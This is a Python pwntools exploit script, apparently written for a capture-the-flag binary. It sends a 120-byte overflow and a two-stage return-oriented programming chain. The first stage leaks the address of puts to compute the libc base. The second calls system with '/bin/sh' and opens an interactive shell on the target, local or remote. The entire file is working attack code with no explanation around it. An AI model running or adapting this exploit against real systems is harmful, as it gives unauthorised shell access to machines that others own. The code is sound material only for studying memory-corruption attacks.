from pwn import *
import struct
import re
import sys

BINARY = './myapp'

# IP = "10.10.10.147"
# PORT = 1337

IP = "127.0.0.1"
PORT = 6868

LOCAL = True
PRINT = False


BUFFER_LEN = 120
BUFFER = b"A" * BUFFER_LEN

if not PRINT:
    if LOCAL:
        context.terminal = "bash"
        context.binary = BINARY
        io = process(BINARY)

    else:
        io = remote(IP, PORT)

if PRINT:
    sys.stdout.buffer.write(payload)
else:

    # # ROUND 1
    g1      = p64(0x40120b) # pop rdi ; ret
    got_put = p64(0x404018)
    plt_put = p64(0x401030)
    main    = p64(0x40115f)

    payload = BUFFER
    payload += g1
    payload += got_put
    payload += plt_put
    payload += main

    print(io.recvuntil("\n\n"))
    io.sendline(payload)
    print(io.recvline())
   
    log.success("## Starting the first chain ##")

    leaked_puts = io.recvline().strip().ljust(8, b'\x00')
    log.success("Leaked puts@LIBC -- " + str(leaked_puts))

    # ROUND 2
    log.success("## Starting the second chain ##")
    libc_system = 0x0449c0
    libc_puts   = 0x071910
    libc_sh     = 0x181519

    leaked_puts = u64(leaked_puts)
    offset = leaked_puts - libc_puts
    sys = p64(offset + libc_system)
    sh = p64(offset + libc_sh)

    payload = BUFFER
    payload += g1
    payload += sh
    payload += sys

    print(io.recvuntil("\n\n"))
    io.sendline(payload)
    print(io.recvline())
    
    io.interactive()
